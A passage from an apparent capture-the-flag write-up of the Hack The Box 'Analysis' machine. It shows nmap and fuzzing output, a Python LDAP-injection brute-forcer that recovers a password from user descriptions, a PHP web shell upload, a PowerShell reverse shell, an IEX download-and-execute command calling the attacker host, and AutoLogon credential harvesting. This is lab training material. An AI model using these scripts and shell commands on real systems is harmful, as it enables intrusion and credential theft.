+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08
+SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
+SF:05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TL
+SF:SSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
+SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Four
+SF:OhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0
+SF:\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%
+SF:r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10
+SF:\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05
+SF:HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\
+SF:0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x
+SF:20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WM
+SF:SRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\
+SF:x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message
+SF:-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(af
+SF:p,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
+SF:0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\
+SF:0");
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-06-05T20:05:20
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jun  5 22:05:29 2024 -- 1 IP address (1 host up) scanned in 87.48 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>RPC, Kerberos, DNS and MySQL enumeration doesn’t return nothing interesting.
+LDAP gives us the domain <code>analysis.htb</code> in nmap scripts so we can add this line to the <code>/etc/hosts</code> file to correctly resolve this domain to the target ip:</p>
+
+<pre><code class="language-bash">10.10.11.250 analysis.htb
+</code></pre>
+
+<p>Now let’s jump to web enumeration.</p>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>First let’s see the technologies used with whatweb:</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.250
+http://10.10.11.250 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.11.250], Microsoft-HTTPAPI[2.0], Title[Not Found]
+</code></pre>
+
+<p>We see a <code>404 Not Found</code> status code with the IP, let’s try the domain:</p>
+
+<pre><code class="language-bash">❯ whatweb http://analysis.htb
+http://analysis.htb [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.250], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
+</code></pre>
+
+<p>Nothing interesting, now searching for subdomains we can see internal.analysis.htb with <code>403 Forbidden</code> access:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.analysis.htb" -u http://analysis.htb --hh=315
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://analysis.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000387:   403        29 L     95 W       1268 Ch     "internal"                                                                                                             
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 0
+</code></pre>
+
+<p>Add internal.analysis.htb to the <code>/etc/hosts</code>.</p>
+    
+      <h1 id="access-as-svc_web">
+        
+        
+          Access as svc_web <a href="#access-as-svc_web" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Although the / returns 403, we can try to fuzz to see available files/directories, I will use feroxbuster as it searches recursively and we save a lot of time with a lowercase dictionary (as it’s windows) and extension php (as when we start to fuzz we can see that it uses PHP):</p>
+
+<pre><code class="language-bash">❯ feroxbuster --url http://internal.analysis.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x php -C 404 -t 100
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://internal.analysis.htb
+ 🚀  Threads               │ 100
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+ 💢  Status Code Filters   │ [404]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET       29l       93w     1284c http://internal.analysis.htb/                                                                                                 
+301      GET        2l       10w      170c http://internal.analysis.htb/users =&gt; http://internal.analysis.htb/users/                                                            
+200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php                                                                                          
+301      GET        2l       10w      174c http://internal.analysis.htb/dashboard =&gt; http://internal.analysis.htb/dashboard/                                                    
+302      GET        0l        0w        3c http://internal.analysis.htb/dashboard/logout.php =&gt; ../employees/login.php                                                          
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css =&gt; http://internal.analysis.htb/dashboard/css/                                              
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img =&gt; http://internal.analysis.htb/dashboard/img/                                            
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib =&gt; http://internal.analysis.htb/dashboard/lib/                                              
+200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php                                                                                   
+301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads =&gt; http://internal.analysis.htb/dashboard/uploads/                               
+301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js =&gt; http://internal.analysis.htb/dashboard/js/                                           
+200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/index.php                                                                                 
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/                                                                                          
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php                                                                                  
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/css/                                                                                       
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/lib/                                                                                           
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/img/                                                                                            
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php                                                                                    
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/uploads/                                                                                      
+403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/js/                                                                                           
+301      GET        2l       10w      174c http://internal.analysis.htb/employees =&gt; http://internal.analysis.htb/employees/                                                    
+200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php                                                                                   
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
+[####################] - 7m    244415/244415  0s      found:25      errors:837    
+[####################] - 7m     56294/56294   130/s   http://internal.analysis.htb/ 
+[####################] - 7m     56294/56294   128/s   http://internal.analysis.htb/users/ 
+[####################] - 7m     56294/56294   128/s   http://internal.analysis.htb/dashboard/ 
+[####################] - 7m     56294/56294   139/s   http://internal.analysis.htb/employees/ 
+</code></pre>
+
+<p>I will focus on those with 200 status code:</p>
+
+<p>In the list.php, we get a <code>missing parameter</code> message:</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET http://internal.analysis.htb/users/list.php
+missing parameter        
+</code></pre>
+
+<p>Let’s try fuzzing for this parameter with a specific wordlist of parameters (/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt) hidding with <code>--hs</code> the string <code>missing parameter</code>:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://internal.analysis.htb/users/list.php?FUZZ=test' --hs="missing parameter"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://internal.analysis.htb/users/list.php?FUZZ=test
+Total requests: 6453
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000003598:   200        0 L      11 W       406 Ch      "name"                                                                                                                 
+
+Total time: 0
+Processed Requests: 6453
+Filtered Requests: 6452
+Requests/sec.: 0
+</code></pre>
+
+<p>We see the parameter <code>name</code>. In the browser, it seems to be a search for users as that fields says ‘Username’, ‘Last Name’, ‘…’:</p>
+
+<p><img src="/assets/images/Analysis/search_users_functionality.png" alt="Search users functionality" /></p>
+
+<p>Trying SQL injections doesn’t work:</p>
+
+<p><img src="/assets/images/Analysis/sql_injection1_doesn't_work.png" alt="SQL injection 1 doesn't work" /></p>
+
+<p><img src="/assets/images/Analysis/sql_injection2_doesn't_work.png" alt="SQL injection 2 doesn't work" /></p>
+
+<p>Let’s fuzz special characters for different responses with wfuzz and hidding the string “CONTACT_” as it’s what we receive in a invalid response and urlencoding it as some characters may conflict with url special characters:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -z file,/opt/SecLists/Fuzzing/special-chars.txt,urlencode -u 'http://internal.analysis.htb/users/list.php?name=FUZZ' --hs="CONTACT_"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://internal.analysis.htb/users/list.php?name=FUZZ
+Total requests: 32
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000010:   200        0 L      1 W        8 Ch        "%28"                                                                                                                  
+000000009:   200        0 L      11 W       418 Ch      "%2A"                                                                                                                  
+000000011:   200        0 L      1 W        8 Ch        "%29"                                                                                                                  
+000000021:   200        0 L      1 W        8 Ch        "%5C"                                                                                                                  
+
+Total time: 0.345897
+Processed Requests: 32
+Filtered Requests: 28
+Requests/sec.: 92.51290
+
+❯ php -r 'echo urldecode("%29\n"); echo urldecode("%28\n"); echo urldecode("%2A\n"); echo urldecode("%5C\n");';echo
+)
+(
+*
+\
+</code></pre>
+
+<p>We see that those characters return different responses and trying the wildcard returns the user <code>technician</code>:</p>
+
+<p><img src="/assets/images/Analysis/wildcard_valid_response.png" alt="Wildcard valid response" /></p>
+
+<p>A common service that uses this characters is <a href="https://www.okta.com/identity-101/what-is-ldap/">LDAP</a>, which makes sense as it’s a windows machine and we saw the port 389, 3268 (LDAP) opened in nmap. Also, this could have a vulnerability called <a href="https://book.hacktricks.xyz/pentesting-web/ldap-injection">LDAP injection</a>, and trying it here with burpsuite (to urlencode characters) we can see that it works:</p>
+
+<p><img src="/assets/images/Analysis/ldap_injection_valid.png" alt="LDAP injection valid" /></p>
+
+<p>As this query searches for username, we can try to bruteforce them with the wildcard to see which users are available, for example t with * (as we known that a valid user is technician) returns a valid response:</p>
+
+<p><img src="/assets/images/Analysis/ldap_valid_response_with_t_and_wildcard.png" alt="LDAP valid response with t and wildcard" /></p>
+
+<p>But a invalid, returns a response with the <code>CONTACT_</code> string:</p>
+
+<p><img src="/assets/images/Analysis/ldap_invalid_response_with_f_and_wildcard.png" alt="LDAP invalid response with f and wildcard" /></p>
+
+<p>Using this criteria, I can create a python script that loops into all the characters and makes the http request, in case that <code>CONTACT_</code> string is found in response, it will continue until it found that <code>CONTACT_</code> string is not found in the response. In the case that it’s not found, it will add the character to a variable and continue with the requests with this variable and the character. Also, instead of using requests library, I will use aiohttp and asyncio to have very fast speed:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+import string, requests
+import pdb, sys
+import signal
+import aiohttp
+import asyncio
+from pwn import *
+
+# Ctrl+c
+def def_handler(sig,frame):
+    print("\n\n[-] Exiting...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Fetch a url and return the response
+async def fetch(session, url, retries=3):
+    for attempt in range(retries):
+        try:
+            async with session.get(url) as response:
+                return await response.text()
+        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
+                if attempt &lt; retries - 1:
+                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                else:
+                    print(f"Failed to fetch {url}: {e}")
+                    return None
+
+async def makeRequests():
+    chars = string.ascii_lowercase + string.digits
+    results = []
+    p1 = log.progress("Brute status")
+    p2 = log.progress("Currently finding username")
+    p3 = log.progress("Finded usernames")
+    async with aiohttp.ClientSession() as session:
+        for char in chars:
+            
+            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
+            r = await fetch(session, first_url)
+            end_loop = False
+            if "CONTACT_" not in r:
+                result = char 
+                while True:
+                    for char in chars:
+                        
+                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
+                        r = await fetch(session,url)
+                        if "CONTACT_" not in r:
+                            result += char
+                            break
+                        else:
+                            if char == chars[-1]:
+                                end_loop = True
+                                results.append(result)
+                                p3.status(results)
+                                break
+                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
+                        p2.status(result)
+                    if end_loop:
+                        break            
+if __name__ == '__main__':
+    
+    asyncio.run(makeRequests())
+</code></pre>
+
+<p>Now run the script and we are gived valid users:</p>
+
+<pre><code class="language-bash">❯ python3 ldap_injection.py
+[◒] Brute status: 36/36
+[d] Currently finding username: technician
+[0] Finded usernames: ['amanson', 'badam', 'jangel', 'lzen', 'technician']
+</code></pre>
+
+<p>Now let’s brute all the valid fields in LDAP to see the interesting ones and then see the value for each user.</p>
+
+<p>For that,</p>
+
+<p>I will modify the script for that we can pass the thing that we wanna brute in the script. Also I will do some handling when the characters <code>*</code>, <code>(</code>, <code>)</code>, <code>&amp;</code> and <code>#</code> because if there is that character in the request, it will behave bad:</p>
+
+<p><img src="/assets/images/Analysis/double_wildcard_fails.png" alt="Double wildcard fails" /></p>
+
+<p>But if I put a wildcard before some letters and after the letters there is a wildcard, the first wildcard will be treated as a string and not as a wildcard. So I will modify the script to include the function above and the one to bruteforce fields and to select from the terminal which to use with sys.argv. Also, I will replace in the chars ‘(‘, ‘)’, ‘&amp;’ and ‘#’ with nothing assuming there aren’t those characters in the field names:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+import string, requests
+import pdb, sys
+import signal
+import aiohttp
+import asyncio
+from pwn import *
+
+# Handle ctrl+c
+def def_handler(sig,frame):
+    print("\n\n[-] Exiting...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+chars = string.ascii_letters + string.digits + string.punctuation
+chars = chars.replace(')', '').replace('(', '').replace('&amp;', '').replace('#', '')
+
+# Function to fetch a url and return a response
+
+async def fetch(session, url, retries=3):
+    for attempt in range(retries):
+        try:
+            async with session.get(url) as response:
+                return await response.text()
+        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
+                if attempt &lt; retries - 1:
+                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                else:
+                    print(f"Failed to fetch {url}: {e}")
+                    return None
+
+# Function to brute valid usernames
+async def bruteUsernames():
+    chars = string.ascii_lowercase + string.digits
+    results = []
+    p1 = log.progress("Brute status")
+    p2 = log.progress("Currently finding username")
+    p3 = log.progress("Finded usernames")
+    async with aiohttp.ClientSession() as session:
+        for char in chars:
+            
+            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
+            r = await fetch(session, first_url)
+            end_loop = False
+            if "CONTACT_" not in r:
+                result = char 
+                while True:
+                    for char in chars:
+                        
+                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
+                        r = await fetch(session,url)
+                        if "CONTACT_" not in r:
+                            result += char
+                            break
+                        else:
+                            if char == chars[-1]:
+                                end_loop = True
+                                results.append(result)
+                                p3.status(results)
+                                break
+                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
+                        p2.status(result)
+                    if end_loop:
+                        break
+# Function to enumerate valid fields
+async def bruteFields():
+    p1 = log.progress("All fields")
+    p2 = log.progress("Currently finding attribute")
+    results = []
+    result = ''
+    async with aiohttp.ClientSession() as session:
+        with open("/opt/SecLists/Fuzzing/LDAP-active-directory-attributes.txt", "r") as f:
+            for attribute in f.readlines():
+                p2.status(attribute)
+                attribute = attribute.strip("\n")
+                url = f"http://internal.analysis.htb/users/list.php?name=*)({attribute}%3d*"
+                r = await fetch(session, url)
+                
+                if "CONTACT_" not in r and "&lt;strong&gt;" in r:
+                    results.append(attribute)
+                p1.status(results)
+if __name__ == '__main__':
+    
+    if len(sys.argv) &lt; 2:
+        print(f"""[i] Usage: python3 {sys.argv[0]} [usernameEnum/bruteFieldContent/bruteFields]
+                - usernameEnum: enumerates usernames of the machine
+                - bruteFields: brute all valid fields.
+              """)
+        sys.exit(1)
+    else:
+        if sys.argv[1] == "usernameEnum":
+            asyncio.run(bruteUsernames())
+        elif sys.argv[1] == "bruteFields":
+            asyncio.run(bruteFields())
+        else:
+            print("Invalid value of arguments")
+
+</code></pre>
+
+<p>Now execute it:</p>
+
+<pre><code class="language-bash">❯ python3 ldap_injection.py bruteFields
+[p] All fields: ['accountExpires', 'badPasswordTime', 'badPwdCount', 'cn', 'codePage', 'countryCode', 'createTimeStamp', 'description', 'distinguishedName', 'givenName', 'instanceType', 'lastLogoff', 'lastLogon', 'logonCount', 'modifyTimeStamp', 'name', 'nTSecurityDescriptor', 'objectCategory', 'objectClass', 'objectGUID', 'objectSid', 'pwdLastSet', 'replPropertyMetaData', 'sAMAccountName', 'sAMAccountType', 'sn', 'userAccountControl', 'userPrincipalName']
+[◓] Currently finding attribute: userSharedFolder
+</code></pre>
+
+<p>The only interesting field is the description.
+Now that we have valid users and all valid fields, we can loop through them to brute their description to see if there is some privileged info. For that, I will create the function bruteFieldContent that also do some handling for the <code>*</code> character for the case it’s in the description. This is the final complete script:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+import string, requests
+import pdb, sys
+import signal
+import aiohttp
+import asyncio
+from pwn import *
+
+# Handle ctrl+c
+def def_handler(sig,frame):
+    print("\n\n[-] Exiting...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+chars = string.ascii_letters + string.digits + string.punctuation
+chars = chars.replace(')', '').replace('(', '').replace('&amp;', '').replace('#', '')
+
+# Function to fetch a url and return a response
+
+async def fetch(session, url, retries=3):
+    for attempt in range(retries):
+        try:
+            async with session.get(url) as response:
+                return await response.text()
+        except (aiohttp.ClientOSError, aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
+                if attempt &lt; retries - 1:
+                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                else:
+                    print(f"Failed to fetch {url}: {e}")
+                    return None
+
+# Function to brute valid usernames
+async def bruteUsernames():
+    chars = string.ascii_lowercase + string.digits
+    results = []
+    p1 = log.progress("Brute status")
+    p2 = log.progress("Currently finding username")
+    p3 = log.progress("Finded usernames")
+    async with aiohttp.ClientSession() as session:
+        for char in chars:
+            
+            first_url = f"http://internal.analysis.htb/users/list.php?name={char}*"
+            r = await fetch(session, first_url)
+            end_loop = False
+            if "CONTACT_" not in r:
+                result = char 
+                while True:
+                    for char in chars:
+                        
+                        url = f"http://internal.analysis.htb/users/list.php?name={result}{char}*"
+                        r = await fetch(session,url)
+                        if "CONTACT_" not in r:
+                            result += char
+                            break
+                        else:
+                            if char == chars[-1]:
+                                end_loop = True
+                                results.append(result)
+                                p3.status(results)
+                                break
+                        p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
+                        p2.status(result)
+                    if end_loop:
+                        break
+# Function to enumerate valid fields
+async def bruteFields():
+    p1 = log.progress("All fields")
+    p2 = log.progress("Currently finding attribute")
+    results = []
+    result = ''
+    async with aiohttp.ClientSession() as session:
+        with open("/opt/SecLists/Fuzzing/LDAP-active-directory-attributes.txt", "r") as f:
+            for attribute in f.readlines():
+                p2.status(attribute)
+                attribute = attribute.strip("\n")
+                url = f"http://internal.analysis.htb/users/list.php?name=*)({attribute}%3d*"
+                r = await fetch(session, url)
+                
+                if "CONTACT_" not in r and "&lt;strong&gt;" in r:
+                    results.append(attribute)
+                p1.status(results)
+# Function to brute content of a specific field
+async def bruteFieldContent(field,username):
+    p1 = log.progress(f"Brute forcing field '{field}' of username '{username}'")
+    p2 = log.progress(f"Content of {field} of {username}")
+
+    result = ''
+    end_while_loop = False
+    async with aiohttp.ClientSession() as session:
+        while True:
+            for char in chars:
+                p1.status(f"{[*chars].index(char) + 1}/{len(chars)}")
+                url = f"http://internal.analysis.htb/users/list.php?name={username})({field}%3d{result}{char}*"
+                r = await fetch(session, url)
+                end_for_loop = False
+                if "CONTACT_" not in r and "&lt;strong&gt;" in r:
+                    result += char
+                    p2.status(result)
+                    break
+                elif char == chars[-1]:
+                    end_while_loop = True
+                    break
+                elif char == '*':
+                    for char in chars:
+                        char = '*' + char
+                        url = f"http://internal.analysis.htb/users/list.php?name={username})({field}%3d{result}{char}*"
+                        r = await fetch(session, url)
+                        if "CONTACT_" not in r and "&lt;strong&gt;" in r:
+                            result += char
+                            end_for_loop = True
+                            break
+                if end_for_loop:
+                    break
+                    
+            if end_while_loop:
+                break
+if __name__ == '__main__':
+    
+    if len(sys.argv) &lt; 2:
+        print(f"""[i] Usage: python3 {sys.argv[0]} [usernameEnum/bruteFieldContent/bruteFields]
+                - usernameEnum: enumerates usernames of the machine
+                - bruteFieldContent [field] [username]: specify the field to brute for a specific field and username
+                - bruteFields: brute all valid fields.
+              """)
+        sys.exit(1)
+    else:
+        if sys.argv[1] == "usernameEnum":
+            asyncio.run(bruteUsernames())
+        elif sys.argv[1] == "bruteFieldContent":
+            if not sys.argv[2] or not sys.argv[3]:
+                print("Please specify field and username")
+            field = sys.argv[2]
+            username = sys.argv[3]
+            asyncio.run(bruteFieldContent(field,username))
+        elif sys.argv[1] == "bruteFields":
+            asyncio.run(bruteFields())
+        else:
+            print("Invalid value for arguments")
+</code></pre>
+
+<p>Now execute this to loop through all usernames and see their description:</p>
+
+<pre><code class="language-bash">❯ usernames=(amanson badam jangel lzen technician);for username in ${usernames[@]};do python3 ldap_injection.py bruteFieldContent description $username; done
+[O] Brute forcing field 'description' of username 'amanson': 90/90
+[-] Content of description of amanson
+[v] Brute forcing field 'description' of username 'badam': 90/90
+[d] Content of description of badam
+[-] Brute forcing field 'description' of username 'jangel': 90/90
+[b] Content of description of jangel
+[↙] Brute forcing field 'description' of username 'lzen': 90/90
+[ ] Content of description of lzen
+[/.......] Brute forcing field 'description' of username 'technician': 90/90
+[.] Content of description of technician: 97NTtl*4QP96Bv
+</code></pre>
+
+<p>We can see that the only interesting one is the description of user ‘technician’ which looks like a password. Let’s try this for smb:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.250 -u technician -p '97NTtl*4QP96Bv'
+SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv
+</code></pre>
+
+<p>It works but we can’t access the machine with winrm:</p>
+
+<pre><code class="language-bash">❯ netexec winrm 10.10.11.250 -u technician -p '97NTtl*4QP96Bv'
+SMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
+HTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman
+WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\technician:97NTtl*4QP96Bv
+</code></pre>
+
+<p>Also, enumerating Active Directory with this credentials doesn’t led to nothing useful. But we can use it in the login form of the web that we found before(/employees/login.php) and it works:</p>
+
+<p><img src="/assets/images/Analysis/dashboard_technician.png" alt="Dashboard technician" /></p>
+
+<p>Among all the functionalities, we can see a interesting one that led us upload files:</p>
+
+<p><img src="/assets/images/Analysis/upload_files_func.png" alt="Upload files functionality" /></p>
+
+<p>When we upload a file, it give us the path for the uploaded file:</p>
+
+<p><img src="/assets/images/Analysis/file_path_in_upload.png" alt="File path in upload" /></p>
+
+<p>As the web works with PHP, let’s try to upload a php shell:</p>
+
+<p><img src="/assets/images/Analysis/php_shell_uploaded.png" alt="PHP shell uploaded" /></p>
+
+<p><img src="/assets/images/Analysis/using_php_shell.png" alt="Using PHP shell" /></p>
+
+<p>Now we can use a powershell shell from <a href="https://www.revshells.com/">revshells.com</a>. I will use “Poweshell #3 (Base64)”, urlencode it and pass it to the cmd parameter:</p>
+
+<p><img src="/assets/images/Analysis/rev_shell_powershell_payload.png" alt="Revshell powershell payload" /></p>
+
+<p>And we receive the shell:</p>
+
+<pre><code class="language-bash">❯ rlwrap -cAr nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.225] from (UNKNOWN) [10.10.11.250] 57936
+
+PS C:\inetpub\internal\dashboard\uploads&gt;
+</code></pre>
+
+<p>Now I will use ConPtyShell to stabilize the shell and for showing errors, doing ctrl+c, etc:</p>
+    
+      <h3 id="spawn-http-server-to-share-invoke-conptyshellps1">
+        
+        
+          Spawn http server to share Invoke-ConPtyShell.ps1
+        
+        
+      </h3>
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+    
+      <h3 id="spawn-nc-to-receive-the-shell">
+        
+        
+          Spawn nc to receive the shell
+        
+        
+      </h3>
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+    
+      <h3 id="execute-the-script-from-http-server-and-execute-conptyshell">
+        
+        
+          Execute the script from http server and execute ConPtyShell
+        
+        
+      </h3>
+<pre><code class="language-powershell">PS C:\inetpub\internal\dashboard\uploads&gt; IEX(New-Object Net.WebClient).downloadString("http://10.10.14.225/Invoke-ConPtyShell.ps1")
+PS C:\inetpub\internal\dashboard\uploads&gt; Invoke-ConPtyShell -RemoteIp 10.10.14.225 -RemotePort 443 -Rows 50 -Cols 184
+</code></pre>
+
+<p>Now in the nc listener, do ctrl+z, <code>stty raw -echo;fg</code> and clean with ctrl+l. At the first time when you change directory, it might give an error, but it’s not important and it then will work ok. Now you are in a fully interactive shell and you can do ctrl+c, you have autocomplete and you can view errors that you can have in powershell.</p>
+    
+      <h1 id="access-as-jdoe">
+        
+        
+          Access as jdoe <a href="#access-as-jdoe" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Running WinPEAS, we can see AutoLogon Credentials:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; .\winPEASx64.exe | tee output.txt 
+[...SNIP...]
+</code></pre>
+
+<p>Transfer the output.txt to your machine using <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#smb">smb</a> with credentials (or it will fail). And here we can see the autologon credentials:</p>
+
+<pre><code class="language-bash">❯ cat output.txt
+[...SNIP...]
++----------¦ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  analysis.htb.
+    DefaultUserName               :  jdoe
+    DefaultPassword               :  7y4Z4^*y9Zzj
+[...SNIP...]
+</code></pre>
+
+<p>Also, we can see that it works with winrm:</p>
+
